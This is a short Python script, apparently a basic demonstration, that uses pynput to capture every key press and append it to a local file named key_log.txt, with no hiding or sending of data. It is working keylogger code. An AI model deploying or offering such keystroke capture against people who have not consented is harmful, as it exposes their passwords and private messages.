from pynput import keyboard

# File to save the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}\n")  # Record the character key
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"{key}\n")  # Record special keys

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()